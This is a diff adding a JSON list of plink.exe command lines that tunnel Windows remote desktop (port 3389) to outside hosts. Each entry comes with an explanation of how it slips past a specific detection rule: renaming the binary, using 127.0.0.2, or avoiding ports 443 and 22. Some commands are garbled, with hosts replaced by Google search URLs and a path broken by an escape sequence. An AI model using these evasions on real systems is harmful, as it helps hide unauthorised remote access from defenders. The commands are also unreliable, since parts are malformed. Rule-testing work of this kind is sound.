@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Windows\\Temp\\plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 8080 https://www.google.com/search?q=rdp-tunnel-vps.com",
+    "explanation": "This command bypasses the rule by avoiding the specific port-protocol combinations defined in selection_b2. While it still targets port 3389, selection_b2 requires the presence of ' -P 443' or ' -P 22'. By using port 8080 (or any port other than 443/22) for the SSH connection, the 'all of selection_b*' condition fails."
+  },
+  {
+    "output": "copy C:\\Path\\To\\plink.exe C:\\Windows\\Temp\not_plink.exe && C:\\Windows\\Temp\not_plink.exe -R 3389:localhost:3389 -P 443 https://www.google.com/search?q=tunnel.com",
+    "explanation": "This bypasses selection_a and selection_b1 by renaming the executable. Since selection_a and selection_b1 both rely on the 'Image' field ending in '\\plink.exe', changing the filename to 'not_plink.exe' ensures the detection logic for the image name is not met, even if suspicious command line arguments are used."
+  },
+  {
+    "output": "plink.exe -L 3390:127.0.0.2:3389 -P 443 remoteserver.com",
+    "explanation": "Selection_a looks specifically for ':127.0.0.1:3389'. By using the alternative loopback address '127.0.0.2', the string literal match in selection_a is avoided while functionally achieving the same tunneling result."
+  }
+]
